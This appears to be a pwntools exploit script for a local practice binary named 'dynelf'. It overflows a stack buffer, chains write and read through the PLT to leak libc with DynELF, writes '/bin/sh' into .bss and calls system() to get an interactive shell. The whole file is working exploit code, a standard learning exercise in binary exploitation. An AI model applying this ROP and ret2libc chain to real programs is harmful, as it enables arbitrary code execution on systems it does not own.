#!/usr/bin/env python

from pwn import *
import binascii

Io = process("./dynelf")

# Io.readuntil("What's your name?")

def leak(addr):
    Io.recv(len("What's your name?"))
    fd = p32(1)
    buf = p32(addr)
    count = p32(4)
    write_plt = p32(0x080483E0)
    start_addr = p32(0x08048400) # start function is better than main
    payload = "AAAABBBBCCCCDDDDEEEEFFFFGG" + write_plt + start_addr + fd + buf + count
    Io.sendline(payload)
    Io.recv(len("hello, ") + len(payload) + len("\n")) # What twice ? 
    Io.recv(len("hello, ") + len(payload) + len("\n"))
    leak_addr = Io.recv(4)
    print "[%s] -> [%s] = [%s]" % (hex(addr), hex(u32(leak_addr)), leak_addr.encode("hex"))
    # print "[%s] -> [%s]" % (hex(addr), hex(u32(leak_addr)))
    return leak_addr


d = DynELF(leak, elf=ELF("./dynelf"))
system_addr = d.lookup('system', 'libc')
print "[system()] -> [%s]" % (hex(system_addr))

bss_addr = p32(0x0804A030) # actually is the address of char s[]

# write /bin/sh
Io.recv(len("What's your name?"))
fd = p32(0)
buf = bss_addr
count = p32(8)
read_plt = p32(0x08048390)
start_addr = p32(0x08048400) # start function is better than main
payload = "AAAABBBBCCCCDDDDEEEEFFFFGG" + read_plt + start_addr + fd + buf + count
Io.sendline(payload)
Io.recv(len("hello, ") + len(payload) + len("\n")) # What twice ? 
Io.recv(len("hello, ") + len(payload) + len("\n"))

# send /bin/sh
Io.send("/bin/sh\x00")

# call system
Io.recv(len("What's your name?"))
bin_sh_addr = bss_addr
payload = "AAAABBBBCCCCDDDDEEEEFFFFGG" + p32(system_addr) + "HACK" + bin_sh_addr
Io.sendline(payload)

# interactive()

Io.interactive()
